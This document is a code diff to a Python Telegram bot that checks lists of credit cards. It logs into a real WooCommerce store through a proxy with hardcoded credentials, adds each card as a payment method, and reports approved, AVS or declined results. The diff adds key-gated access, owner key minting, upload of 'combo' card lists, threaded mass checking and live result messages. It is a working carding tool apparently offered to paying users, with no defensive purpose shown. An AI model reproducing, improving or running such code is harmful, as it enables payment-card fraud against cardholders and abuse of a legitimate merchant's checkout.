@@ -12,7 +12,7 @@ proxies_list = ["http://naveed:Qwerty_123ABC@196.244.48.124:12345"]
 def get_proxy():
     return {"http": proxies_list[0], "https": proxies_list[0]}
 
-# ===================== CHECKER WITH BOT LOGS =====================
+# ===================== CHECKER WITH REAL-TIME LOGS =====================
 def Tele(cx, bot, chat_id):
     proxy = get_proxy()
     log_msg = bot.send_message(chat_id, f"🔄 Checking: <code>{cx}</code>", parse_mode="HTML")
@@ -29,7 +29,6 @@ def Tele(cx, bot, chat_id):
 
         bot.edit_message_text(f"🔄 [1/5] Logging in...\n{cc}", chat_id, log_msg.message_id, parse_mode="HTML")
 
-        # Login
         r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
         login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
         login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text).group(1)
@@ -83,10 +82,10 @@ def Tele(cx, bot, chat_id):
 
         if "New payment method added" in response.text or "81724" in response.text:
             bot.edit_message_text(f"✅ <b>HIT</b>\n<code>{cc}</code>\nApproved", chat_id, log_msg.message_id, parse_mode="HTML")
-            return "Approved - New Card Added"
+            return "Approved"
         elif "avs" in response.text.lower():
             bot.edit_message_text(f"⚠️ AVS\n<code>{cc}</code>", chat_id, log_msg.message_id, parse_mode="HTML")
-            return "AVS Declined"
+            return "AVS"
         else:
             bot.edit_message_text(f"❌ Declined\n<code>{cc}</code>", chat_id, log_msg.message_id, parse_mode="HTML")
             return "Declined"
@@ -112,4 +111,64 @@ def redeem_key(message):
     try:
         key = message.text.split()[1]
         if key in valid_keys:
-            redeemed_users.add(message.chat.id
+            redeemed_users.add(message.chat.id)
+            bot.reply_to(message, "✅ Key Activated!")
+        else:
+            bot.reply_to(message, "❌ Invalid Key!")
+    except:
+        bot.reply_to(message, "Usage: /key YOURKEY")
+
+@bot.message_handler(commands=["addkey"])
+def add_key(message):
+    if message.chat.id != OWNER_ID:
+        return bot.reply_to(message, "❌ Only Owner!")
+    try:
+        new_key = message.text.split()[1]
+        valid_keys.add(new_key)
+        bot.reply_to(message, f"✅ New Key: {new_key}")
+    except:
+        bot.reply_to(message, "Usage: /addkey NEWKEY")
+
+@bot.message_handler(content_types=["document"])
+def check(message):
+    user_id = message.chat.id
+    if user_id != OWNER_ID and user_id not in redeemed_users:
+        return bot.reply_to(message, "❌ Access Denied!")
+
+    sto["stop"] = False
+    name = message.from_user.first_name or "User"
+
+    file_info = bot.get_file(message.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    with open("combo.txt", "wb") as f: f.write(downloaded)
+
+    with open("combo.txt") as f:
+        cards = [line.strip() for line in f if line.strip()]
+
+    bot.reply_to(message, f"🔥 Starting Real-Time Check...\nTotal Cards: {len(cards)}")
+
+    def worker(cc):
+        if sto["stop"]: return
+        Tele(cc, bot, message.chat.id)
+
+    threads = []
+    for cc in cards:
+        if sto["stop"]: break
+        t = threading.Thread(target=worker, args=(cc,))
+        threads.append(t)
+        t.start()
+        time.sleep(1.2)
+
+    for t in threads:
+        t.join()
+
+    bot.reply_to(message, "✅ Checking Completed!")
+
+@bot.message_handler(commands=["stop"])
+def stopit(message):
+    sto["stop"] = True
+    bot.reply_to(message, "✅ Stopped")
+
+keep_alive()
+print("✅ Bot Started with Real-Time Logs")
+bot.infinity_polling()
